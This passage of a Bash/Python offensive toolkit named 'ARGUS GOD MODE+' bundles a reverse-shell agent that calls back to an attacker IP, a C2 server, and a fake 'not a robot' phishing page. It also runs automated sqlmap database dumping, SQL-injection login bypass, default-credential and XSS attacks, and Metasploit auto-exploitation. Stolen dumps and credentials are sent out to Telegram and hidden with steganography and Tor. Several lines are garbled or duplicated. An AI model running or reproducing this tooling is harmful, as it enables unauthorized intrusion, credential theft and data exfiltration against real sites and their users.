        host = headers.get('Host', '')
        if host:
            update_cookies(host, headers.get('Cookie', ''))
        
        # ===== COOKIE JAR: Auto-fill =====
        if host and 'Cookie' not in headers:
            saved = get_cookies_string(host)
            if saved:
                headers['Cookie'] = saved
        
        # ===== WebSocket =====
        if headers.get('Upgrade', '').lower() == 'websocket':
            with open(WS_LOG, 'a') as f:
                f.write(f"[{datetime.now().strftime('%H:%M:%S')}] WS {method} {path} from {client_ip}\n")
            print(f"\033[96m[WS] {method} {path}\033[0m")
        
        # ===== Passive scan =====
        for cat, pats in PATTERNS.items():
            for p in pats:
                if re.search(p, path, re.IGNORECASE) or re.search(p, body, re.IGNORECASE) or \
                   any(re.search(p, v, re.IGNORECASE) for v in headers.values()):
                    msg = f"[{cat}] {method} {path}"
                    with open(PASSIVE_LOG, 'a') as f:
                        f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {msg} from {client_ip}\n")
                    color = '\033[91m' if cat in ['SQLi','XSS','LFI','Token','PrivateKeys','SSRF_Params'] else \
                            '\033[93m' if cat in ['CORS','DebugMode','OpenRedirect','NoSQL','XXE'] else '\033[92m'
                    print(f"{color}[PASSIVE] {msg}\033[0m")
                    break
        
        # ===== Repeater display =====
        print(f"\n\033[95m[REPEATER] {'='*50}\033[0m")
        print(f"\033[95m[{datetime.now().strftime('%H:%M:%S')}] {method} {path}\033[0m")
        for k,v in headers.items():
            print(f"\033[95m  {k}: {v}\033[0m")
        if body:
            print(f"\033[95mBody: {body[:500]}\033[0m")
        print(f"\033[95m{'='*50}\033[0m")
        
        # Save to history
        HISTORY.append({
            'time': datetime.now().strftime('%H:%M:%S'),
            'method': method,
            'path': path,
            'headers': dict(headers),
            'body': body,
            'host': host
        })
        if len(HISTORY) > MAX_HISTORY:
            HISTORY.pop(0)
        
        # ===== INTERCEPT =====
        if INTERCEPT_MODE:
            print(f"\n\033[91m[INTERCEPT] Request captured!\033[0m")
            print(f"\033[91m  (f)orward / (d)rop / (e)dit / (i)ntruder / (c)ookie / (h)istory / (q)uit intercept:\033[0m ", end='', flush=True)
            choice = input().strip().lower()
            
            if choice == 'd':
                self.send_response(403); self.end_headers(); return
            elif choice == 'e':
                new_path = input("  New path: ").strip()
                if new_path: path = new_path
            elif choice == 'c':
                jar = load_jar()
                print(f"\033[96m  Cookie Jar:\033[0m")
                for d, cookies in jar.items():
                    print(f"  {d}:")
                    for k,v in cookies.items():
                        print(f"    {k}={v[:40]}")
                print(f"  (c)lear domain / (C)lear all / Enter to continue: ", end='')
                cc = input().strip()
                if cc == 'c':
                    if host: del jar[host]; save_jar(jar); print(f"  Cleared {host}")
                elif cc == 'C':
                    jar = {}; save_jar(jar); print(f"  All cleared")
                self.send_response(200); self.end_headers(); return
            elif choice == 'h':
                for i, h in enumerate(HISTORY[-15:]):
                    print(f"  [{i}] {h['time']} {h['method']} {h['path']}")
                print(f"  (r)eplay # or Enter: ", end='')
                rh = input().strip()
                if rh.isdigit():
                    idx = int(rh)
                    if 0 <= idx < len(HISTORY):
                        h_sel = HISTORY[idx]
                        method = h_sel['method']
                        path = h_sel['path']
                        headers = h_sel['headers']
                        body = h_sel['body']
                        print(f"  Replaying: {method} {path}")
                    else:
                        print(f"  Invalid index")
                        self.send_response(200); self.end_headers(); return
                else:
                    self.send_response(200); self.end_headers(); return
            elif choice == 'i':
                print(f"\033[95m  === INTRUDER ===\033[0m")
                print(f"  Param name: ", end=''); param_name = input().strip()
                print(f"  Wordlist [ids/params/roles/numbers/common]: ", end=''); wl = input().strip()
                wl = wl if wl else 'common'
                results = run_intruder(method, path if path.startswith('http') else f"http://{host}{path}", headers, body, param_name, wl)
                self.send_response(200); self.end_headers(); return
            elif choice == 'q':
                INTERCEPT_MODE = False
                print(f"\033[92m[INTERCEPT] Intercept mode OFF\033[0m")
        
        # ===== Forward =====
        try:
            target_url = path if path.startswith('http') else f"http://{host}{path}"
            req = urllib.request.Request(target_url, method=method)
            for k,v in headers.items():
                if k.lower() not in ['host', 'content-length']:
                    req.add_header(k, v)
            if body:
                req.data = body.encode()
            
            with urllib.request.urlopen(req, timeout=10) as response:
                resp_body = response.read()
                
                # Cookie Jar: capture Set-Cookie from response
                set_cookie = response.headers.get('Set-Cookie', '')
                if host and set_cookie:
                    update_cookies(host, set_cookie)
                
                self.send_response(response.status)
                for k,v in response.headers.items():
                    self.send_header(k, v)
                self.end_headers()
                self.wfile.write(resp_body)
        except Exception as e:
            self.send_response(502)
            self.end_headers()
            self.wfile.write(f"Proxy Error: {e}".encode())

def start_scanner(port, use_ssl=False, intercept=False):
    global INTERCEPT_MODE
    INTERCEPT_MODE = intercept
    
    server = socketserver.TCPServer(('0.0.0.0', port), PassiveScanner)
    
    if use_ssl:
        cert = os.path.expanduser('~/scanner_cert.pem')
        key = os.path.expanduser('~/scanner_key.pem')
        if os.path.exists(cert) and os.path.exists(key):
            server.socket = ssl.wrap_socket(server.socket, certfile=cert, keyfile=key, server_side=True)
    
    protocol = "HTTPS" if use_ssl else "HTTP"
    mode = "INTERCEPT" if intercept else "PASSIVE"
    print(f"\033[92m[+] Passive Scanner + Repeater + Stealth Ops+ ({protocol}) on port {port} [{mode}]\033[0m")
    print(f"\033[93m[*] Proxy: 127.0.0.1:{port}\033[0m")
    print(f"\033[93m[*] Logs: ~/shadow_scan.txt | ~/repeater_log.txt | ~/websocket_log.txt\033[0m")
    print(f"\033[93m[*] Cookie Jar: ~/.cookie_jar.json\033[0m")
    print(f"\033[93m[*] Intruder wordlists: ~/intruder_wordlists/\033[0m")
    print(f"\033[93m[*] Intercept: send SIGUSR1 or restart with --intercept\033[0m")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass

if __name__ == '__main__':
    import sys
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 9990
    use_ssl = '--ssl' in sys.argv
    intercept = '--intercept' in sys.argv
    start_scanner(port, use_ssl, intercept)
PYEOF
    python /data/data/com.termux/files/home/shadow_shadow_passive.py 9990 &
    PASSIVE_PID=$!
    python /data/data/com.termux/files/home/shadow_shadow_passive.py 9443 --ssl &
    PASSIVE_SSL_PID=$!
}

# ===== PROXY + REPEATER =====
interactive_proxy() {
    echo -e "\n${CYAN}[*] Interactive Proxy on port 8080${NC}"
    cat > ~/proxy.py << 'PYEOF'
import http.server, socketserver, urllib.request, sys
PORT = 8080
HISTORY = []
class Proxy(http.server.SimpleHTTPRequestHandler):
    def do_GET(self): self.handle('GET')
    def do_POST(self): self.handle('POST')
    def handle(self, method):
        print(f"\n[REPEATER] {'='*50}")
        print(f"[{method}] {self.path}")
        for k,v in self.headers.items(): print(f"  {k}: {v}")
        content_len = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_len) if content_len else b''
        if body: print(f"Body: {body.decode('utf-8','ignore')[:300]}")
        print(f"{'='*50}")
        HISTORY.append({'method': method, 'path': self.path, 'headers': dict(self.headers), 'body': body})
        choice = input(f"[?] (f)orward / (d)rop / (e)dit / (r)eplay / (i)ntruder / (h)istory / (q)uit: ").strip().lower()
        if choice == 'q': sys.exit(0)
        if choice == 'd': self.send_response(403); self.end_headers(); return
        if choice == 'h':
            for i,h in enumerate(HISTORY[-10:]): print(f"[{i}] {h['method']} {h['path']}")
            choice = 'f'
        if choice == 'r':
            idx = int(input("Replay #: "))
            if 0 <= idx < len(HISTORY):
                h = HISTORY[idx]
                req = urllib.request.Request(h['path'], method=h['method'], data=h['body'])
                for k,v in h['headers'].items():
                    if k.lower() not in ['host']: req.add_header(k,v)
                with urllib.request.urlopen(req, timeout=10) as r:
                    print(f"Response: {r.status}\n{r.read().decode('utf-8','ignore')[:500]}")
            self.send_response(200); self.end_headers(); return
        if choice == 'i':
            param = input("Param name: ").strip()
            wl = input("Wordlist [ids/params/roles/numbers/common]: ").strip() or 'common'
            wf = f"~/intruder_wordlists/{wl}.txt"
            print(f"Intruder: {param} x {wl} (use Passive Scanner for full Intruder)")
            self.send_response(200); self.end_headers(); return
        if choice == 'e':
            new_path = input("New path: ").strip()
            if new_path: self.path = new_path
        req = urllib.request.Request(self.path, method=method)
        for k,v in self.headers.items():
            if k.lower() not in ['host', 'content-length']: req.add_header(k,v)
        if body: req.data = body
        try:
            with urllib.request.urlopen(req, timeout=10) as r:
                self.send_response(r.status)
                for k,v in r.headers.items(): self.send_header(k,v)
                self.end_headers(); self.wfile.write(r.read())
        except Exception as e: print(f"[Error] {e}")
if __name__ == '__main__':
    print(f"Proxy on port {PORT}")
    with socketserver.TCPServer(('', PORT), Proxy) as httpd:
        try: httpd.serve_forever()
        except KeyboardInterrupt: pass
PYEOF
    python ~/proxy.py
}

# ===== C2 =====
meterpreter_c2() {
    echo -e "\n${CYAN}[*] C2 on port 4444${NC}"
    cat > ~/c2.py << 'PYEOF'
import socket, threading, subprocess, base64, time
HOST,PORT = '0.0.0.0',4444
agents, aid = {}, 0
def handle(conn, addr, id):
    agents[id] = {'addr':addr,'conn':conn}
    conn.send(b'whoami\n')
    h = conn.recv(4096).decode().strip()
    agents[id]['hostname'] = h
    print(f"\n[+] Agent #{id} from {addr} - {h}")
    while True:
        try:
            cmd = input(f"\n[agent#{id}] C2> ")
            if cmd == 'quit': conn.send(b'exit\n'); conn.close(); break
            elif cmd == 'list':
                for i,a in agents.items(): print(f"Agent #{i} - {a['hostname']} ({a['addr']})")
            elif cmd == 'screenshot':
                conn.send(b'screenshot\n')
                data = conn.recv(81920)
                fn = f"screenshot_{id}_{int(time.time())}.png"
                with open(fn, 'wb') as f: f.write(base64.b64decode(data))
                print(f"[+] {fn}")
            else: conn.send(f'{cmd}\n'.encode()); print(conn.recv(8192).decode(), end='')
        except: break
if __name__ == '__main__':
    print(f"C2 on port {PORT}")
    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT)); s.listen(5)
    try:
        while True:
            c, a = s.accept(); aid += 1
            threading.Thread(target=handle, args=(c,a,aid), daemon=True).start()
    except KeyboardInterrupt: pass
PYEOF
    python ~/c2.py
}

# ===== ADMIN PANEL =====
web_admin_panel() {
    echo -e "\n${CYAN}[*] Admin on port 5000${NC}"
    cat > ~/admin.py << 'PYEOF'
import http.server, socketserver, os
from datetime import datetime
PORT = 5000
class Admin(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        scans = [d for d in os.listdir(os.path.expanduser('~')) if d.startswith('scan_')]
        html = f'<html><head><title>Argus Scanner Admin</title><style>body{{font-family:monospace;background:#0a0a0a;color:#0f0;padding:20px}}h1{{color:red}}.card{{background:#111;padding:15px;margin:10px;border:1px solid #333}}table{{width:100%;border-collapse:collapse}}td,th{{border:1px solid #333;padding:8px}}th{{color:yellow}}</style></head><body><h1>Argus Scanner Admin Panel</h1><div class="card"><h2>Recent Scans ({len(scans)})</h2><table><tr><th>Scan</th></tr>'
        for s in sorted(scans, reverse=True)[:10]: html += f'<tr><td>{s}</td></tr>'
        html += f'</table></div><div class="card" style="text-align:center;color:#666">Argus Scanner v47.0 PRO | {datetime.now().year}</div></body></html>'
        self.send_response(200); self.send_header('Content-type','text/html'); self.end_headers()
        self.wfile.write(html.encode())
if __name__ == '__main__':
    print(f"Admin on port {PORT}")
    with socketserver.TCPServer(('0.0.0.0', PORT), Admin) as httpd:
        try: httpd.serve_forever()
        except KeyboardInterrupt: pass
PYEOF
    python ~/admin.py &
    WEB_PID=$!
}

# ===== EXE AGENT =====
generate_exe_agent() {
    echo -e "\n${CYAN}[*] EXE Agent${NC}"
    cat > ~/agent.py << PYEOF
import socket, subprocess, time
s = socket.socket(); time.sleep(5)
s.connect(('YOUR_IP', 4444))
while True:
    cmd = s.recv(4096).decode().strip()
    if cmd == 'exit': break
    try: s.send(subprocess.getoutput(cmd).encode() + b'\n')
    except: s.send(b'Error\n')
s.close()
PYEOF
    echo -e "${GREEN}[+] Agent: ~/agent.py${NC}"
}

# ===== PHISHING =====
recaptcha_phish() {
    echo -e "\n${CYAN}[*] Phishing on port 8880${NC}"
    cat > ~/phish.py << 'PYEOF'
import http.server, socketserver
PORT = 8880
HTML = '<!DOCTYPE html><html><head><title>Security Check</title><style>body{font-family:Arial;text-align:center;padding:50px;background:#f0f0f0}.captcha-box{background:white;padding:30px;border-radius:10px;display:inline-block}.btn{background:#4285f4;color:white;border:none;padding:12px 40px;font-size:18px;border-radius:5px;cursor:pointer;margin-top:20px}</style></head><body><div class="captcha-box"><h2>Confirm you are not a robot</h2><button class="btn" onclick="alert(\"Verification complete\")">I am not a robot</button></div></body></html>'
class Phish(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.send_header('Content-type','text/html'); self.end_headers()
        self.wfile.write(HTML.encode())
if __name__ == '__main__':
    print(f"Phishing on port {PORT}")
    with socketserver.TCPServer(('0.0.0.0', PORT), Phish) as httpd:
        try: httpd.serve_forever()
        except KeyboardInterrupt: pass
PYEOF
    python ~/phish.py &
    PHISH_PID=$!
}

# ===== UTILS =====
LANG="${LANG:-ru}"
translate() {
    case "$LANG" in ru) case "$1" in "target_alive") echo "Цель жива (HTTP $2)";; *) echo "$1";; esac;; *) echo "$1";; esac
}

disguise_traffic() { echo "<!-- $(custom_b64_encode "$1") -->"; }

CONFIG_FILE="$HOME/shadow.conf"; CONFIG_LAST_MODIFIED=0
hot_reload_config() {
    [ -f "$CONFIG_FILE" ] && { local cm=$(stat -c %Y "$CONFIG_FILE" 2>/dev/null || echo 0); [ "$cm" -gt "$CONFIG_LAST_MODIFIED" ] && { source "$CONFIG_FILE" 2>/dev/null; CONFIG_LAST_MODIFIED=$cm; }; }
}

STEALTH_PATHS=("/api/news" "/api/status" "/api/v1/data" "/cdn/static" "/assets/js" "/img/logo" "/favicon.ico" "/robots.txt" "/sitemap.xml")
random_stealth_path() { echo "${STEALTH_PATHS[$((RANDOM % ${#STEALTH_PATHS[@]}))]}"; }

PLUGIN_DIR="$HOME/shadow_plugins"; mkdir -p "$PLUGIN_DIR"
run_plugins() { local stage=$1; [ -d "$PLUGIN_DIR" ] && for plugin in "$PLUGIN_DIR"/*.sh; do [ -f "$plugin" ] && [ -x "$plugin" ] && bash "$plugin" "$TARGET" "$REPORT" 2>/dev/null; done; }

# ===== MAIN MENU =====
banner() {
    clear
    echo -e "${RED}"
# Авто-очистка временных файлов
echo -e "\n${CYAN}[*] Cleaning up...${NC}"
rm -f /tmp/passlist.txt /tmp/pass_chunk_* /tmp/gql_payloads.txt /tmp/rockyou_dl.txt /tmp/ua_list.txt 2>/dev/null
rm -f /tmp/ai_suggestions.txt /tmp/cover_*.jpg /tmp/stego_*.jpg 2>/dev/null
find /tmp -name ".shadow_*" -mtime +1 -delete 2>/dev/null
echo -e "${GREEN}[+] Временные файлы удалены${NC}"
echo ""
    echo "╔══════════════════════════════════════════════╗"
    echo "║   ARGUS v40.0 - GOD MODE+            ║"
    echo "║   + INTRUDER + COOKIE JAR                    ║"
    echo "╚══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

show_menu() {
    echo ""
    echo -e "${WHITE}Select mode:${NC}"
    echo "  [1]  Full Scan"
    echo "  [2]  Proxy + Repeater (8080)"
    echo "  [3]  C2 (4444)"
    echo "  [4]  Admin Panel (5000)"
    echo "  [5]  OSINT + Bug Bounty"
    echo "  [6]  Passive + Repeater + Intruder (9990/9443)"
    echo "  [7]  Phishing (8880)"
    echo "  [8]  EXE Agent"
    echo "  [9]  P2P + Learning"
    echo " [10]  Dead Man Switch"
    echo " [11]  Stego Exfil"
    echo " [12]  Scheduler"
    echo " [13]  Nmap Quick"
    echo " [14]  Cookie Jar Manager"
    echo ""
    read -p "Choice: " MODE_CHOICE
}

# ===== COOKIE JAR MANAGER =====
cookie_jar_manager() {
    echo -e "\n${CYAN}[COOKIE JAR] Manager${NC}"
    echo "  [1] List all cookies"
    echo "  [2] Clear domain"
    echo "  [3] Clear all"
    read -p "Choice: " cjm
    case $cjm in
        1) cookie_jar_list ;;
        2) read -p "Domain: " d; cookie_jar_clear "$d" ;;
        3) cookie_jar_clear ;;
    esac
    exit 0
}

[ -z "$1" ] && { banner; show_menu; } || MODE_CHOICE=1

TARGET=$1
DOMAIN=$(echo $TARGET | sed 's|https\?://||' | cut -d/ -f1)
REPORT="scan_$(date +%Y%m%d_%H%M%S)"

case $MODE_CHOICE in
    2) interactive_proxy; exit 0 ;;
    3) meterpreter_c2; exit 0 ;;
    4) web_admin_panel; sleep 999999; exit 0 ;;
    5) social_osint "$DOMAIN"; bug_bounty_hunter "$DOMAIN"; exit 0 ;;
    6) start_passive_scanner; sleep 999999; exit 0 ;;
    7) recaptcha_phish; sleep 999999; exit 0 ;;
    8) generate_exe_agent; exit 0 ;;
    9) p2p_cve_update; exit 0 ;;
    10) deadman_checkin; exit 0 ;;
    11) steganography_exfil "$HACKED/credentials.txt" 2>/dev/null; exit 0 ;;
    12) attack_scheduler; exit 0 ;;
    13) health_check; nmap -T4 --min-rate 1000 -sV --top-ports 1000 -oN "$REPORT/nmap.txt" $DOMAIN 2>/dev/null; cat "$REPORT/nmap.txt" | grep "open"; exit 0 ;;
    14) cookie_jar_manager; exit 0 ;;
esac

mkdir -p "$REPORT"
HACKED="$REPORT/hacked"; OSINT="$REPORT/osint"
mkdir -p "$HACKED" "$OSINT"

init_learning_db

banner
echo -e "\n${CYAN}[*] API Auto-Detect...${NC}"${WHITE}Target: $TARGET | Report: $REPORT/${NC}"
echo -e "\n${CYAN}[*] API Auto-Detect...${NC}"${YELLOW}Mode: FULL v47.0 - Stealth Ops+${NC}"

hot_reload_config
# ===== ПРЕДПОЛЕТНАЯ ПРОВЕРКА =====
echo -e "\n${CYAN}[0/24] Pre-flight check...${NC}"
MISSING=""
for cmd in nmap sqlmap curl python3 openssl; do
    if ! command -v $cmd >/dev/null 2>&1; then
        echo -e "  ${RED}❌ $cmd не найден${NC}"
        MISSING="$MISSING $cmd"
    else
        echo -e "  ${GREEN}✅ $cmd${NC}"
    fi
done
if [ -n "$MISSING" ]; then
    echo -e "${RED}[!] Установи: pkg install $MISSING${NC}"
    exit 1
fi
echo ""
health_check

# === LIVE CVE CHECK (2025-2026) ===
echo -e "\n${CYAN}[*] Live CVE Check (2025-2026)...${NC}"
[ -x ~/shadow_live_cve.sh ] && ~/shadow_live_cve.sh "$TARGET" &
CVE_PID=$!

TOR_ACTIVE=false
[ -x "$(which tor 2>/dev/null)" ] && start_tor && TOR_ACTIVE=true

decoy_generator &
start_passive_scanner &
start_collaborator 8888 &
dead_mans_switch &

tg_send "🔍 v47.0 GOD MODE+: $TARGET"

osint_collect
social_osint "$DOMAIN"
cms_detect
cms_deep_detect

echo -e "\n${CYAN}[*] API Auto-Detect...${NC}"\n${CYAN}[3/24] Nmap...${NC}"
nmap -T4 --min-rate 1000 -sV --top-ports 1000 -oN "$REPORT/nmap.txt" $DOMAIN 2>/dev/null &
NMAP_PID=$!

async_dir_brute
auto_exploit_files
run_nuclei_scan

echo -e "\n${CYAN}[*] API Auto-Detect...${NC}"\n${CYAN}[5/24] WAF...${NC}"
[ -x "$(which wafw00f 2>/dev/null)" ] && wafw00f $TARGET 2>/dev/null | tee "$REPORT/waf.txt"

echo -e "\n${CYAN}[*] API Auto-Detect...${NC}"\n${CYAN}[6/24] SQL Injection...${NC}"
timeout 300 # Фаза 1: Быстрая проверка (MySQL — 90% сайтов)
echo -e "\n${CYAN}[*] API Auto-Detect...${NC}"
${CYAN}[6a/24] SQL Injection — Phase 1 (MySQL)...${NC}"
sqlmap -u "$TARGET" \
    --threads=10 \
    --timeout=10 \
    --retries=1 \
    --delay=1 \
    --dbms=mysql \
    --skip-urlencode \
    --no-cast \
    --fresh-queries \
    --null-connection \
    --batch \
    --random-agent \
    --forms \
    --crawl=5 \
    --level=2 \
    --risk=2 \
    --dbs \
    --tables \
    --dump \
    --output-dir="$REPORT/sqlmap" 2>/dev/null

# Фаза 2: Глубокая проверка (все СУБД) — если MySQL ничего не нашёл
if ! find "$REPORT/sqlmap" -name "*.csv" -size +0 2>/dev/null | grep -q .; then
    echo -e "
${CYAN}[6b/24] SQL Injection — Phase 2 (All DBMS)...${NC}"
    sqlmap -u "$TARGET" \
        --threads=5 \
        --timeout=10 \
        --retries=1 \
        --delay=1 \
        --skip-urlencode \
        --no-cast \
        --fresh-queries \
        --null-connection \
        --batch \
        --random-agent \
        --forms \
        --crawl=5 \
        --level=2 \
        --risk=2 \
        --dbs \
        --tables \
        --dump \
        --output-dir="$REPORT/sqlmap_phase2" 2>/dev/null
fi
    --threads=10 \
    --timeout=10 \
    --retries=1 \
    --delay=1 \
    --dbms=mysql \
    --skip-urlencode \
    --no-cast \
    --fresh-queries \
    --null-connection \
    --output-dir="$REPORT/sqlmap"  --batch --random-agent --forms --crawl=5 --level=2 --risk=2 --delay=2 --timeout=30 --dbs --tables --dump --output-dir="$REPORT/sqlmap" 2>/dev/null
find "$REPORT/sqlmap" -name "*.csv" -exec grep -iE "password|passwd|email|user|admin|login|secret|token" {} \; 2>/dev/null > "$HACKED/sql_dump.txt"
[ -s "$HACKED/sql_dump.txt" ] && { tg_send "🚨 SQL ДАМП!"; tg_send_file "$HACKED/sql_dump.txt"; learn_success "SQL" "sqlmap-dump" "$TARGET"; ai_deep_analyze "SQL injection" "$TARGET"; }

echo -e "\n${CYAN}[*] API Auto-Detect...${NC}"\n${CYAN}[7/24] Auth...${NC}"
LOGIN=""
for path in /login /admin/login /administrator /wp-login.php /signin /auth /user/login /account/login /index.php /Login /Admin /user/signin; do
    code=$(proxy_curl -s -o /dev/null -w "%{http_code}" -A "$(random_agent)" "$TARGET$path")
    [ "$code" = "200" ] && LOGIN="$TARGET$path" && break
done

if [ -n "$LOGIN" ]; then
    echo -e "${GREEN}[+] Login: $LOGIN${NC}"
    for sqli in "' OR '1'='1" "' OR 1=1--" "admin'--"; do
        r=$(proxy_curl -s -A "$(random_agent)" -d "username=$sqli&password=$sqli" "$LOGIN")
        if echo "$r" | grep -qi "welcome\|dashboard\|admin\|logout\|profile"; then
            echo -e "${RED}[!] SQL BYPASS: $sqli${NC}"
            echo "SQL Bypass: $sqli" >> "$HACKED/auth_bypass.txt"
            tg_send "🚨 АВТОРИЗАЦИЯ ОБОЙДЕНА!"
            break
        fi
    done
    IFS=';' read -ra CREDS <<< "$(cat ~/default_creds.txt | tr '\n' ';')"
    for pair in "${CREDS[@]}"; do
        user="${pair%%:*}"; pass="${pair##*:}"
        r=$(proxy_curl -s -A "$(random_agent)" -d "username=$user&password=$pass" "$LOGIN")
        if ! echo "$r" | grep -qi "incorrect\|invalid\|wrong\|error\|неверный"; then
            echo -e "${RED}[!] DEFAULT: $user/$pass${NC}"
            echo "$user:$pass @ $LOGIN" >> "$HACKED/credentials.txt"
            # Save to Cookie Jar
            cookie_jar_save "$DOMAIN" "session=$user"
            tg_send "🚨 ДЕФОЛТ: $user:$pass"
            break
        fi
    done
    async_brute "$LOGIN"
    [ -s "$HACKED/credentials.txt" ] && { tg_send "🚨 ПАРОЛЬ НАЙДЕН!"; tg_send_file "$HACKED/credentials.txt"; }
fi

echo -e "\n${CYAN}[*] API Auto-Detect...${NC}"\n${CYAN}[8/24] XSS...${NC}"
for payload in '<script>alert(1)</script>' '"><script>alert(1)</script>'; do
    r=$(proxy_curl -s -A "$(random_agent)" "$TARGET?q=$payload" 2>/dev/null)
    if echo "$r" | grep -Fq "$payload"; then
        echo -e "${RED}[!] XSS${NC}"
        echo "XSS: $payload" >> "$HACKED/xss.txt"
        tg_send "🚨 XSS!"
        break
    fi
done

wait $NMAP_PID 2>/dev/null

# Parallel injections + Nuclei
nosql_injection & ldap_injection & xxe_injection & ssti_injection &
command_injection & file_inclusion & ssrf_check & header_injection &
second_order_sqli & graphql_injection & websocket_injection &
wait
command_injection; file_inclusion; ssrf_check; header_injection; second_order_sqli
graphql_injection; websocket_injection

# === РАСШИРЕННЫЕ ИНЪЕКЦИИ (v48.0) ===
echo -e "\n${CYAN}[*] API Auto-Detect...${NC}"
${CYAN}[13/24] Advanced Injections...${NC}"
[ -x ~/shadow_advanced_sqli.sh ] && ~/shadow_advanced_sqli.sh "$TARGET" &
[ -x ~/shadow_advanced_xss.sh ] && ~/shadow_advanced_xss.sh "$TARGET" &
[ -x ~/shadow_advanced_injections.sh ] && ~/shadow_advanced_injections.sh "$TARGET" &
wait

cve_exploit_scan
msf_auto_exploit
bug_bounty_hunter "$DOMAIN"

[ -s "$HACKED/sql_dump.txt" ] || [ -f "$HACKED/cmdi.txt" ] && chain_builder "$HACKED" "$TARGET"

[ -f "$HACKED/credentials.txt" ] && steganography_exfil "$HACKED/credentials.txt"

hot_reload_config
leak_check; subdomain_takeover; hidden_params
run_plugins "post_scan"

# Chained Exploit Linker
echo -e "\n${CYAN}[*] API Auto-Detect...${NC}"\n${CYAN}[21/24] Chain Linker...${NC}"
[ -x ~/shadow_chain_linker.sh ] && ~/shadow_chain_linker.sh "$REPORT"

echo -e "\n${CYAN}[*] API Auto-Detect...${NC}"\n${PURPLE}[23/24] Reports...${NC}"
HTML_FILE=$(generate_html_report)
generate_pdf_report
generate_json_report
generate_csv_report
generate_xml_report

cat > "$REPORT/summary.txt" << EOF
ARGUS v40.0 GOD MODE+ REPORT
Date: $(date) | Target: $TARGET
Passwords: $(cat ~/passwords.txt | tr ';' '\n' | wc -l) | Threads: 50
Nuclei: $(wc -l < "$REPORT/nuclei_results.txt" 2>/dev/null) | Passive: $(wc -l < "$HOME/passive_scan.txt" 2>/dev/null)
SQL: $([ -s "$HACKED/sql_dump.txt" ] && echo 'YES' || echo 'NO') | XSS: $([ -f "$HACKED/xss.txt" ] && echo 'YES' || echo 'NO')
Credentials: $(cat $HACKED/credentials.txt 2>/dev/null | head -5 || echo 'No')
Cookie Jar: $(python3 -c "import json; print(len(json.load(open('$COOKIE_JAR_FILE'))))" 2>/dev/null || echo 0) domains
PDF: ${REPORT}/report.pdf | HTML: $HTML_FILE | JSON: ${REPORT}/report.json | CSV: ${REPORT}/report.csv | XML: ${REPORT}/report.xml
EOF

cat "$REPORT/summary.txt"
SUMMARY=$(cat "$REPORT/summary.txt" | tr '\n' '%0A')
tg_send "📊 v47.0 GOD MODE+ завершён!%0A%0A$SUMMARY"
tg_send_file "$REPORT/nmap.txt"; tg_send_file "$HTML_FILE"
[ -f "${REPORT}/report.pdf" ] && tg_send_file "${REPORT}/report.pdf"
[ -f "${REPORT}/report.json" ] && tg_send_file "${REPORT}/report.json"
[ -f "${REPORT}/report.csv" ] && tg_send_file "${REPORT}/report.csv"
[ -f "${REPORT}/report.xml" ] && tg_send_file "${REPORT}/report.xml"
[ -f "$REPORT/nuclei_results.txt" ] && tg_send_file "$REPORT/nuclei_results.txt"
[ -f "$HACKED/msf_exploits.txt" ] && tg_send_file "$HACKED/msf_exploits.txt"

[ -n "$PASSIVE_PID" ] && kill $PASSIVE_PID 2>/dev/null
[ -n "$PASSIVE_SSL_PID" ] && kill $PASSIVE_SSL_PID 2>/dev/null
[ -n "$COLLAB_PID" ] && kill $COLLAB_PID 2>/dev/null
[ "$TOR_ACTIVE" = true ] && killall tor 2>/dev/null
echo -e "\n${CYAN}[*] API Auto-Detect...${NC}"${GREEN}║   ✅ v47.0 GOD MODE+ COMPLETE!               ║${NC}"

# ===== AI ANALYZER (DeepSeek API) =====
ai_deep_analyze() {
    local finding="$1"
    local context="$2"
    [ -z "$AI_API_KEY" ] && AI_API_KEY="YOUR_DEEPSEEK_API_KEY"
    echo -e "\n${PURPLE}[AI] Analysing...${NC}"
    local prompt="Security finding: ${finding}. Context: ${context}. Explain briefly - How to exploit, Risk, Fix."
    local response=$(curl -s --max-time 15 "https://api.deepseek.com/v1/chat/completions" -H "Authorization: Bearer $AI_API_KEY" -H "Content-Type: application/json" -d "{\"model\":\"deepseek-chat\",\"messages\":[{\"role\":\"user\",\"content\":\"$prompt\"}]}" 2>/dev/null)
    if echo "$response" | grep -q "choices"; then
        local answer=$(echo "$response" | python3 -c "import sys,json; print(json.load(sys.stdin)[\"choices\"][0][\"message\"][\"content\"])" 2>/dev/null)
        echo -e "${GREEN}[AI] Answer:${NC}"
        echo -e "${WHITE}$answer${NC}"
        echo "$answer" >> "$REPORT/ai_analysis.txt"
    fi
}

cms_detect() {
    local html=$(curl -s --max-time 10 "$TARGET" 2>/dev/null)
    echo "$html" | grep -qi "wp-content" && echo -e "${GREEN}[+] WordPress${NC}"
}
